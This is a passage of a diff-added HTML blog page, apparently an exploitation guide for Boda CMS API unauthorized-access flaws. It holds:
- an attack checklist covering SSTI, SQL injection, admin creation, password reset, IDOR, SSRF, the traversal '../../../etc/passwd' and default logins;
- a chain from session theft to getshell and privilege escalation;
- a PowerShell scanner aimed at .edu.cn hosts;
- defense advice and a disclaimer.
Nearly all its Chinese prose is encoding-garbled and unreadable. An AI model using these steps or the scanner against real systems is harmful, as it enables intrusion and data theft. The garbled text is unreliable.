+<li><input disabled="" type="checkbox"> <code>POST /api/template/save</code> 鈫?SSTI payload 娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/template/edit</code> 鈫?SSTI payload 娴嬭瘯</li>
+</ul>
+<p>*<em>P1 绾?鈥?淇℃伅娉勯湶锛?</em></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>GET /api/user/list</code> 鈫?鐢ㄦ埛鍒楄〃娉勯湶</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/config</code> 鈫?绯荤粺閰嶇疆娉勯湶</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/database</code> 鈫?鏁版嵁搴撻厤缃硠闇?- [ ] <code>GET /api/site/list</code> 鈫?绔欑偣鍒楄〃娉勯湶</li>
+</ul>
+<p>*<em>P1 绾?鈥?鐢ㄦ埛绠＄悊锛?</em></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>POST /api/user/add?role=admin</code> 鈫?娣诲姞绠＄悊鍛?- [ ] <code>POST /api/user/resetPassword</code> 鈫?閲嶇疆浠绘剰瀵嗙爜</li>
+<li><input disabled="" type="checkbox"> <code>POST /api/user/login</code> 鈫?SQL 娉ㄥ叆娴嬭瘯</li>
+</ul>
+<p>*<em>P1 绾?鈥?IDOR锛?</em></p>
+<ul>
+<li><input disabled="" type="checkbox"> 閬嶅巻 <code>siteId=1,2,3...</code> 鈫?璺ㄧ珯鎿嶄綔</li>
+<li><input disabled="" type="checkbox"> 閬嶅巻 <code>articleId=1,2,3...</code> 鈫?璺ㄧ珯鏁版嵁鑾峰彇</li>
+</ul>
+<p>*<em>P2 绾?鈥?SSRF&#x2F;鐩綍閬嶅巻锛?</em></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>GET /api/import?url=http://鍐呯綉IP</code> 鈫?SSRF</li>
+<li><input disabled="" type="checkbox"> <code>GET /api/download?file=../../../etc/passwd</code> 鈫?鐩綍閬嶅巻</li>
+</ul>
+<p><strong>P3 绾?鈥?寮卞彛浠わ細</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>admin/admin</code> 鐧诲綍娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> <code>admin/admin123</code> 鐧诲綍娴嬭瘯</li>
+<li><input disabled="" type="checkbox"> 鐖嗙牬 <code>/vsb/admin/</code> 鍚庡彴</li>
+</ul>
+<h3 id="Phase-3锛氭繁搴﹀埄鐢"><a href="#Phase-3锛氭繁搴﹀埄鐢" class="headerlink" title="Phase 3锛氭繁搴﹀埄鐢?"></a>Phase 3锛氭繁搴﹀埄鐢?</h3><ul>
+<li><input disabled="" type="checkbox"> 浠?Druid Session 娉勯湶绐冨彇绠＄悊鍛樹細璇?- [ ] 浠庝俊鎭硠闇茶幏鍙栨暟鎹簱鍑瘉 鈫?杩炴帴鏁版嵁搴撴嫋鍙栧悗鍙拌处鍙?- [ ] 閫氳繃鏂囦欢涓婁紶 Getshell 鈫?鎻愭潈</li>
+<li><input disabled="" type="checkbox"> 浠?SSRF 鍚戝唴缃戞墿灞曟敾鍑婚潰</li>
+<li><input disabled="" type="checkbox"> 閫氳繃鐩綍閬嶅巻涓嬭浇鍏ㄩ儴婧愮爜 鈫?鐧界洅瀹¤鏇村婕忔礊</li>
+</ul>
+<hr>
+<h2 id="鍏€侀槻寰″缓璁"><a href="#鍏€侀槻寰″缓璁" class="headerlink" title="鍏€侀槻寰″缓璁?"></a>鍏€侀槻寰″缓璁?</h2><h3 id="8-1-瀵硅繍缁存柟"><a href="#8-1-瀵硅繍缁存柟" class="headerlink" title="8.1 瀵硅繍缁存柟"></a>8.1 瀵硅繍缁存柟</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>缁熶竴閴存潈</strong></td>
+<td align="left">鎵€鏈?API 绔偣蹇呴』鏍￠獙韬唤鍜屾潈闄愶紝浣跨敤 Spring Security&#x2F;Shiro 妗嗘灦</td>
+</tr>
+<tr>
+<td align="left"><strong>鍏抽棴 Swagger</strong></td>
+<td align="left">鐢熶骇鐜绂佺敤 Swagger 鏂囨。灞曠ず</td>
+</tr>
+<tr>
+<td align="left">*<em>Druid 鍔犺闂帶鍒?</em></td>
+<td align="left"><code>/druid/*</code> 璺緞闄愬埗鍐呯綉鎴栧姞鐧诲綍楠岃瘉</td>
+</tr>
+<tr>
+<td align="left">*<em>鏈€灏忔潈闄愬師鍒?</em></td>
+<td align="left">API 鍙繑鍥炲繀瑕佸瓧娈碉紝涓嶆毚闇叉暟鎹簱&#x2F;Session&#x2F;瀵嗙爜淇℃伅</td>
+</tr>
+<tr>
+<td align="left"><strong>API 缃戝叧</strong></td>
+<td align="left">閫氳繃 Nginx&#x2F;APISIX 缁熶竴绠℃帶 API 璁块棶</td>
+</tr>
+<tr>
+<td align="left"><strong>鍙婃椂鍗囩骇</strong></td>
+<td align="left">鑱旂郴鍗氳揪鍘傚晢鑾峰彇鏈€鏂扮増鏈ˉ涓?</td>
+</tr>
+<tr>
+<td align="left"><strong>WAF 瑙勫垯</strong></td>
+<td align="left">瀵?<code>/api/</code> 璺緞閰嶇疆涓ユ牸 ACL</td>
+</tr>
+<tr>
+<td align="left"><strong>鏂囦欢涓婁紶鏍￠獙</strong></td>
+<td align="left">鐧藉悕鍗曞悗缂€ + 鍐呭妫€娴?+ 涓嶅彲鎵ц鐩綍瀛樺偍</td>
+</tr>
+</tbody></table>
+<h3 id="8-2-瀵规祴璇曟柟"><a href="#8-2-瀵规祴璇曟柟" class="headerlink" title="8.2 瀵规祴璇曟柟"></a>8.2 瀵规祴璇曟柟</h3><table>
+<thead>
+<tr>
+<th align="left">鍘熷垯</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">鍚堟硶鎺堟潈</td>
+<td align="left">鎵€鏈夋祴璇曞繀椤诲湪鎺堟潈鑼冨洿鍐呰繘琛?</td>
+</tr>
+<tr>
+<td align="left">涓嶈秺绾㈢嚎</td>
+<td align="left">绂佹 <code>--dump</code> 鎷栧簱銆佺姝?DDOS銆佺姝㈢牬鍧忔€ф搷浣?</td>
+</tr>
+<tr>
+<td align="left">鏈€灏忓寲璇佹嵁</td>
+<td align="left">淇℃伅娉勯湶绫讳粎鎴彇蹇呰鍑瘉鍗冲彲璇佹槑锛屼笉涓嬭浇鍏ㄩ噺鏁版嵁</td>
+</tr>
+<tr>
+<td align="left">鍙婃椂鎶ュ憡</td>
+<td align="left">鍙戠幇 API 鏈巿鏉冩紡娲炲悗鍙婃椂鎻愪氦鑷?SRC 鎴栫敤鎴峰崟浣?</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="闄勶細鏌ヨ鑴氭湰"><a href="#闄勶細鏌ヨ鑴氭湰" class="headerlink" title="闄勶細鏌ヨ鑴氭湰"></a>闄勶細鏌ヨ鑴氭湰</h2><h3 id="鎵归噺妫€娴嬭剼鏈紙PowerShell锛"><a href="#鎵归噺妫€娴嬭剼鏈紙PowerShell锛" class="headerlink" title="鎵归噺妫€娴嬭剼鏈紙PowerShell锛?"></a>鎵归噺妫€娴嬭剼鏈紙PowerShell锛?</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鍗氳揪CMS API鏈巿鏉冩壒閲忔娴?$targets = @(</span></span><br><span class="line">  <span class="string">&quot;http://target1.edu.cn&quot;</span>,</span><br><span class="line">  <span class="string">&quot;http://target2.edu.cn&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable">$checks</span> = <span class="selector-tag">@</span>(</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/user/list&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;鐢ㄦ埛鍒楄〃娉勯湶&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/config&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;绯荤粺閰嶇疆娉勯湶&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/druid/index.html&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;Druid鐩戞帶&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/swagger-ui.html&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;Swagger鏂囨。&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/api/upload&quot;</span>; Method=<span class="string">&quot;POST&quot;</span>; Desc=<span class="string">&quot;鏂囦欢涓婁紶鎺ュ彛&quot;</span>&#125;,</span><br><span class="line">  <span class="selector-tag">@</span>&#123;Path=<span class="string">&quot;/vsb/admin/&quot;</span>; Method=<span class="string">&quot;GET&quot;</span>; Desc=<span class="string">&quot;鍚庡彴鐧诲綍椤?&#125;</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach (<span class="variable">$target</span> in <span class="variable">$targets</span>) &#123;</span></span><br><span class="line"><span class="string">  Write-Host &quot;</span>`n=== 妫€娴嬬洰鏍? <span class="variable">$target</span> ===<span class="string">&quot; -ForegroundColor Cyan</span></span><br><span class="line"><span class="string">  foreach (<span class="variable">$check</span> in <span class="variable">$checks</span>) &#123;</span></span><br><span class="line"><span class="string">    <span class="variable">$url</span> = <span class="variable">$target</span>.TrimEnd(&#x27;/&#x27;) + <span class="variable">$check</span>.Path</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">      <span class="variable">$resp</span> = Invoke-WebRequest -Uri <span class="variable">$url</span> -Method <span class="variable">$check</span>.Method -TimeoutSec 10 -UseBasicParsing</span></span><br><span class="line"><span class="string">      if (<span class="variable">$resp</span>.StatusCode -eq 200) &#123;</span></span><br><span class="line"><span class="string">        Write-Host &quot;</span>[<span class="type">FOUND</span>] <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (Status: <span class="variable">$</span>(<span class="variable">$resp</span>.StatusCode))<span class="string">&quot; -ForegroundColor Green</span></span><br><span class="line"><span class="string">      &#125; else &#123;</span></span><br><span class="line"><span class="string">        Write-Host &quot;</span>[<span class="type">SKIP</span>] <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (Status: <span class="variable">$</span>(<span class="variable">$resp</span>.StatusCode))<span class="string">&quot; -ForegroundColor Gray</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125; catch &#123;</span></span><br><span class="line"><span class="string">      Write-Host &quot;</span>[<span class="type">ERR</span>]  <span class="variable">$</span>(<span class="variable">$check</span>.Desc) =&gt; <span class="variable">$url</span> (<span class="variable">$</span>(<span class="variable">$_</span>.Exception.Message))<span class="string">&quot; -ForegroundColor DarkGray</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p><strong>鍏嶈矗澹版槑</strong>锛氭湰鏂囨。浠呬緵瀹夊叏鐮旂┒鍜屾巿鏉冩祴璇曚娇鐢ㄣ€傛湭缁忔巿鏉冪殑 API 鏈巿鏉冭闂娴嬪彲鑳芥瀯鎴愯繚娉曡涓猴紝璇蜂弗鏍奸伒瀹堛€婄綉缁滃畨鍏ㄦ硶銆嬪強鐩稿叧娉曞緥娉曡銆</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/API/" rel="tag"># API</a>
+              <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="tag"># 未授权</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+              <a href="/tags/CMS/" rel="tag"># CMS</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/07/09/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/" rel="prev" title="验证码绕过技术详解">
+      <i class="fa fa-chevron-left"></i> 验证码绕过技术详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/07/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" rel="next" title="渗透测试常见问题汇总">
+      渗透测试常见问题汇总 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%8D%97%E6%B0%B3%E6%8F%AACMS-API%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82%EE%86%BD%E7%B4%A1%E5%A8%B2%E7%82%B2%E5%9E%8E%E9%8F%8B%E6%84%AA%E7%AC%8C%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%B8%E5%9B%A7%E5%B4%A1"><span class="nav-number">1.</span> <span class="nav-text">鍗氳揪CMS API鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%90%A9%EE%86%BC%E7%B6%8D"><span class="nav-number">1.1.</span> <span class="nav-text">鐩綍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E2%82%AC%E9%8A%86%E4%BD%B7%E9%AA%87%E9%8D%9D%E4%BD%BD%E5%84%97%E9%8F%85%EE%88%99%E7%AC%8C%E9%90%97%E7%91%B0%E7%B7%9B%E7%92%87%E5%97%97%E5%9F%86"><span class="nav-number">1.2.</span> <span class="nav-text">涓€銆佷骇鍝佽儗鏅笌鐗瑰緛璇嗗埆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B5%9C%D1%83%E6%90%A7%E5%A7%92%E5%82%9D%E5%A0%AA"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 浜у搧姒傝堪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E9%8E%B8%E5%9B%A9%E6%B1%97%E9%90%97%E7%91%B0%E7%B7%9B"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 鎸囩汗鐗瑰緛</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP-%E9%8D%9D%E5%B6%85%E7%B0%B2%E6%BE%B6%E5%AF%B8%E5%A3%92%E5%AF%B0"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">HTTP 鍝嶅簲澶寸壒寰?&#96;&#96;&#96;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%9B%E6%A8%BF%EE%85%BB%E7%BB%94%EE%88%9A%E5%BD%9B"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">榛樿绔彛</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E9%8D%9A%E5%BA%A1%E5%BD%B4%E7%92%BA%EE%88%9A%E7%B7%9E"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">甯歌鍚庡彴璺緞</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E6%B6%93%E5%A9%81%E7%B4%B6%E7%BB%94%EE%88%9C%E5%81%A3%E9%94%9B%E5%A0%A5%E6%B8%B6%E7%80%B9%E7%82%BA%E6%AA%AF%E9%8E%B6%E6%92%B3%E5%BD%87%E9%8E%B4-JS-%E9%8D%99%E5%B6%87%E7%B4%AA%E7%92%87%E6%88%A0%E2%80%98%E7%92%81%E3%82%8F%E7%B4%9A"><span class="nav-number">2.</span> <span class="nav-text">甯歌涓婁紶绔偣锛堥渶瀹為檯鎶撳彇鎴?JS 鍙嶇紪璇戠‘璁わ級</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%A6%AF%E2%84%83%E6%BE%98%E5%A8%89%E3%84%A5%E5%8F%86-SSTI-%E9%88%AB-RCE"><span class="nav-number">2.0.1.</span> <span class="nav-text">3.2 妯℃澘娉ㄥ叆 &#x2F; SSTI 鈫?RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AA%E5%8F%86%E9%8D%99"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">妫€娴嬪叆鍙?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%AC%E6%BF%8A%E7%9F%BE"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">鍒╃敤鎬濊矾</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E9%8D%99%E5%B6%85%E7%B0%AD%E9%8D%92%E6%A5%80%E5%AF%B2-%E9%88%AB-RCE"><span class="nav-number">2.0.2.</span> <span class="nav-text">3.3 鍙嶅簭鍒楀寲 鈫?RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AA%E5%8F%86%E9%8D%99-1"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">妫€娴嬪叆鍙?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%AC%E6%BF%8A%E7%9F%BE-1"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">鍒╃敤鎬濊矾</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E6%B5%A0%E7%BB%98%E5%89%B0%E9%8D%9B%E6%88%92%E6%8A%A4%E9%8E%B5%D1%86%EE%94%91"><span class="nav-number">2.0.3.</span> <span class="nav-text">3.4 浠绘剰鍛戒护鎵ц</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E7%91%99%EF%B9%80%E5%BD%82%E9%90%90"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">甯歌瑙﹀彂鐐?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%A5%E6%B6%96%E2%82%AC%E4%BD%B7%E8%85%91%E6%A5%82%E6%A8%BA%E5%B5%84%E5%A9%95%E5%BF%94%E7%A4%8A%E9%94%9B%E5%9C%A51-P2%E9%94%9B"><span class="nav-number">2.1.</span> <span class="nav-text">鍥涖€佷腑楂樺嵄婕忔礊锛圥1-P2锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E9%8F%81%E5%BF%94%E5%8A%85%E6%B7%87%E2%84%83%E4%BC%85%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">2.1.1.</span> <span class="nav-text">4.1 鏁忔劅淇℃伅娉勯湶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%B0%E5%8B%AC%E6%B9%A1%E9%8D%9D%E5%B6%85%E7%B0%B2%E9%94%9B%E5%9C%9DSON-%E9%8F%8D%E7%85%8E%E7%B4%A1%E9%94%9B"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">棰勬湡鍝嶅簲锛圝SON 鏍煎紡锛?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%A7%98%E6%9D%91%E9%92%A9%E7%93%92%E5%A9%83%E6%BD%88%E9%94%9B%E5%9C%9BDOR%E9%94%9B"><span class="nav-number">2.1.2.</span> <span class="nav-text">4.2 姘村钩瓒婃潈锛圛DOR锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%A6%E7%83%98%E6%AB%99"><span class="nav-number">2.1.2.1.</span> <span class="nav-text">娴嬭瘯鍦烘櫙</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%96%BE"><span class="nav-number">2.1.2.2.</span> <span class="nav-text">鍒╃敤閾?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E9%8D%A8%E5%82%9C%E6%B4%BF%E7%93%92%E5%A9%83%E6%BD%88-%E6%B5%A0%E7%BB%98%E5%89%B0%E9%90%A2%E3%84%A6%E5%9F%9B%E5%A8%A3%E8%AF%B2%E5%A7%9E"><span class="nav-number">2.1.3.</span> <span class="nav-text">4.3 鍨傜洿瓒婃潈 &#x2F; 浠绘剰鐢ㄦ埛娣诲姞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-1"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF-PoC"><span class="nav-number">2.1.3.2.</span> <span class="nav-text">娴嬭瘯 PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%B5%A0%E7%BB%98%E5%89%B0%E7%80%B5%E5%97%99%E7%88%9C%E9%96%B2%E5%B6%87%E7%96%86"><span class="nav-number">2.1.4.</span> <span class="nav-text">4.4 浠绘剰瀵嗙爜閲嶇疆</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-2"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-SQL-%E5%A8%89%E3%84%A5%E5%8F%86"><span class="nav-number">2.1.5.</span> <span class="nav-text">4.5 SQL 娉ㄥ叆</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%8F%E3%83%A5%E5%BD%9B"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">娴嬭瘯鍏ュ彛</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-Druid-%E9%90%A9%E6%88%9E%E5%B8%B6%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">2.1.6.</span> <span class="nav-text">4.6 Druid 鐩戞帶鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-3"><span class="nav-number">2.1.6.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%97%E5%8D%9E%EE%86%8A%E9%94%9B%E6%B0%B6%E2%82%AC%E6%B0%B3%E7%B9%83-Session-%E5%A8%89%E5%8B%AF%E6%B9%B6%E9%90%A9%E5%AD%98%E5%B8%B4%E7%BB%90%E5%86%A8%E5%BD%87%E7%BB%A0%EF%BC%84%E6%82%8A%E9%8D%9B%E6%A8%B9%E7%B4%B0%E7%92%87-%E9%88%AB-%E9%91%BE%E5%B3%B0%E5%BD%87%E9%8D%9A%E5%BA%A1%E5%BD%B4%E9%8F%89%E5%86%AE%E6%AA%BA%E9%8A%86"><span class="nav-number">2.2.</span> <span class="nav-text">鍗卞锛氶€氳繃 Session 娉勯湶鐩存帴绐冨彇绠＄悊鍛樹細璇?鈫?鑾峰彇鍚庡彴鏉冮檺銆?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-Swagger-API-%E9%8F%82%E5%9B%A8%E3%80%82%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">2.2.1.</span> <span class="nav-text">4.7 Swagger API 鏂囨。娉勯湶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E7%92%BA%EE%88%9A%E7%B7%9E-4"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">娴嬭瘯璺緞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%9C%E6%96%BB%E2%82%AC%E4%BD%B7%E8%85%91%E9%8D%97%E8%BE%A8%E7%B4%A1%E5%A8%B2%E7%83%87%E7%B4%99P2-P3%E9%94%9B"><span class="nav-number">2.3.</span> <span class="nav-text">浜斻€佷腑鍗辨紡娲烇紙P2-P3锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-SSRF%E9%94%9B%E5%A0%9F%E6%B9%87%E9%8D%94%EF%BC%84%EE%81%AC%E7%92%87%E9%94%8B%E7%9C%B0%E6%B5%BC%EE%81%88%E2%82%AC%E7%8B%85%E7%B4%9A"><span class="nav-number">2.3.1.</span> <span class="nav-text">5.1 SSRF锛堟湇鍔＄璇锋眰浼€狅級</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%8F%E3%83%A5%E5%BD%9B-1"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">娴嬭瘯鍏ュ彛</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">鍒╃敤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E9%90%A9%EE%86%BC%E7%B6%8D%E9%96%AC%E5%B6%85%E5%B7%BB-%E6%B5%A0%E7%BB%98%E5%89%B0%E9%8F%82%E5%9B%A6%E6%AC%A2%E7%92%87%E8%AF%B2%E5%BD%87"><span class="nav-number">2.3.2.</span> <span class="nav-text">5.2 鐩綍閬嶅巻 &#x2F; 浠绘剰鏂囦欢璇诲彇</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%8D%8F%E3%83%A5%E5%BD%9B-2"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">娴嬭瘯鍏ュ彛</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%8F%E6%8A%BD%E6%95%AD%E7%92%87%E8%AF%B2%E5%BD%87%E9%90%A9%EE%86%BD%E7%88%A3"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">鍏抽敭璇诲彇鐩爣</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%8F%EE%85%9C%E2%82%AC%E4%BD%B8%E5%87%A1%E9%90%AD%E3%83%A5%E7%95%BC%E9%8F%82%E7%91%B0%E7%95%A8%E9%8D%8F%E3%84%A5%EF%BC%90%E9%8F%84"><span class="nav-number">2.4.</span> <span class="nav-text">鍏€佸凡鐭ュ畼鏂瑰畨鍏ㄥ０鏄?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 